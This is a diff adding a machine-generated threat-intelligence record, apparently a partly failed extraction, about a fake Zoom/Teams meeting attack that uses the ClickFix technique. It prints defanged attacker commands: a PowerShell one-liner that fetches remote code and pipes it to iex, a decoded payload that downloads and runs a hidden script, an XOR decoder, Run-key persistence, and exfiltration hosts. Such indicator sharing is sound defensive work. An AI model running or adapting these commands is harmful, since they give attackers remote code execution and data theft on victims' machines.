@@ -1,0 +1,49 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T12:36:32.505086
+# Response length: 2461 chars
+# Input chunk preview: 'y hardware | Apple MacBook Pro (MacBookPro18,1) | Screen recording metadata || Host OS | macOS 15.5 | Screen recording metadata || Guest OS | Windows 10 (VMware VM) | Game DVR / Game Bar screen captur'
+# ============================================================
+
+title: "Zoom and Microsoft Teams Fake Meeting Interface Attack"
+description: The attack chain involves a fake meeting interface that exfiltrates camera footage and delivers a payload via ClickFix technique.
+attribution: ""
+malware_families: []
+cves: []
+ttps:
+  processes:
+    - powershell.exe
+  command_lines:
+    - cmd set ZOOM_API_KEY="BOtlweWKewotkWQKEWODNXCSK" set ZOOM_API_SECRET="QYrYiRfRTYTPL7RVZ09yRths2MXZSQV7" set ZOOM_SDK_UTILITY="normal" set ZOOM_SDK_LEVEL="High" set ZOOM_LANGUAGE="en-US" setx audio_volume 100 pnputil /enum-devices /connected /class "Audio" start hxxps://developers[.]zoom[.]us/docs/meeting-sdk <INJECTED POWERSHELL PAYLOAD> cls exit
+    - powershell -ep bypass -c "(iwr -Uri hxxps://uu03webzoom[.]us/developer/sdk/update/version/[REDACTED] -UserAgent 'ZoomSDK' -UseBasicParsing).Content | iex"
+  powershell:
+    - $5kd023ng="hxxps://uu03webzoom[.]us/developer/sdk/fix/2/version/Ivo55HpFm" # Decoded payload actions (after Base64+XOR 0x43 decode): # 1. Download chromechip.log $b9uf3o4y = $env:TEMP+'\chromechip.log' Invoke-WebRequest -Uri $5kd023ng -UserAgent "ZoomSDK" -OutFile "$b9uf3o4y" # 2. Execute in hidden window Start-Process powershell.exe -ArgumentList "-ep Bypass -c `"Get-Content '$($b9uf3o4y)' | iex`"" -WindowStyle Hidden # 3. Lure completion dialog [System.Windows.Forms.MessageBox]::Show("Zoom was updated successfully.", "Zoom Update Complete", [System.Windows.Forms.MessageBoxButton]::OK, [System.Windows.Forms.MessageBoxImage]::Information)
+    - {[Text.Encoding]::UTF8.GetString([byte[]]([Convert]::FromBase64String($_)| ForEach-Object{[byte]($_ -bxor 0x43)}))}
+  scripts: []
+  registry_keys:
+    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads: []
+  network_connections:
+    - powershell.exe -> thriddata[.]com/upload
+    - powershell.exe -> uxlink.mslive[.]us:443
+    - powershell.exe -> nubit[.]teams-live[.]org:443
+    - powershell.exe -> bitlayer[.]teams-meet[.]us:443
+    - powershell.exe -> 83[.]136[.]208[.]246:6783
+  file_activity:
+    - %TEMP%\chromechip.log
+  persistence:
+    - Registry Run key pointing to a PowerShell script
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+    - 83[.]136[.]208[.]246
+  domains:
+    - uu03webzoom[.]us
+    - thriddata[.]com
+    - uxlink.mslive[.]us
+    - nubit[.]teams-live[.]org
+    - bitlayer[.]teams-meet[.]us
+    - developers[.]zoom[.]us
+  urls:
+    - hxxps://uu03webzoom[.]us/developer/sdk/update/version/[REDACTED]
+authors: []
